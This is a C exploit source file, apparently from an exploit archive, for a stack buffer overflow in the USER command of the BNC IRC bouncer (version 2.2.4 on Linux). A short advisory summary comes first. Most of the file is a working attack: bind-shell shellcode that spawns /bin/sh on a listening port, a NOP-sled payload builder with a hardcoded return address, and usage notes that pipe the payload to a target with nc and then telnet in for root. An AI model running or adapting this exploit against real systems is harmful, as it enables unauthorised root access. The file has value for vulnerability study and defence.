/*
source: http://www.securityfocus.com/bid/1927/info

BNC's IRC Proxy is used as a gateway to an IRC server.

A buffer stores a username which arguments the program's USER command. User-supplied input to this buffer is improperly checked for length.

As a result, the excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling functions' return address. Since this data is supplied by the user it can be crafted to alter the program's flow of execution. 

If properly exploited, this can yield root privilege to the attacker.
*/


/*
* SDI irc bouncer exploit
*
* This source exploits a buffer overflow in the bnc,
* popular irc bouncer, binding a shell.
*
* Tested against bnc 2.2.4 running on linux.
*
* usage:
* lame:~# gcc SDI-bnc.c -o SDI-bnc
*
* lame:~# (SDI-bnc 0; cat) | nc www.lame.org 666
* `-> offset, zero in most cases
*
* lame:~# telnet www.lame.org 10752
*
*
* by jamez and dumped from sekure SDI (www.sekure.org)
*
* email: securecode@sekure.org
*
* merry christmas and happy 1999 ;)
*
*/

/* c0nd0r :* */
char bindcode[] =
"\x33\xDB\x33\xC0\xB0\x1B\xCD\x80\x33\xD2\x33\xc0\x8b\xDA\xb0\x06"
"\xcd\x80\xfe\xc2\x75\xf4\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x62"
"\xeb\x62\x5e\x56\xac\x3c\xfd\x74\x06\xfe\xc0\x74\x0b\xeb\xf5\xb0"
"\x30\xfe\xc8\x88\x46\xff\xeb\xec\x5e\xb0\x02\x89\x06\xfe\xc8\x89"
"\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb\xfe\xc3\x89\xf1\xcd"
"\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66\x89\x46\x0e\x8d"
"\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0"
"\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\xeb\x04"
"\xeb\x4c\xeb\x52\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80"
"\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1"
"\xcd\x80\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46"
"\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
"\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x45\xff\xff"
"\xff\xFF\xFD\xFF\x50\x72\x69\x76\x65\x74\x20\x41\x44\x4D\x63\x72\x65\x77";

#define SIZE 1600
#define NOP 0x90

char buffer[SIZE];

void main(int argc, char * argv[])
{
int i, x, offset = 0;
long addr;

if(argc > 1) offset = atoi(argv[1]);

addr = 0xbffff6ff + offset; /* evil addr */

for(i = 0; i < SIZE/3; i++)
buffer[i] = NOP;

for(x = 0; x < strlen(bindcode); i++, x++)
buffer[i] = bindcode[x];

for (; i < SIZE; i += 4)
{
buffer[i ] = addr & 0x000000ff;
buffer[i+1] = (addr & 0x0000ff00) >> 8;
buffer[i+2] = (addr & 0x00ff0000) >> 16;
buffer[i+3] = (addr & 0xff000000) >> 24;
}

buffer[SIZE - 1] = 0;

printf("USER %s\n", buffer);

}
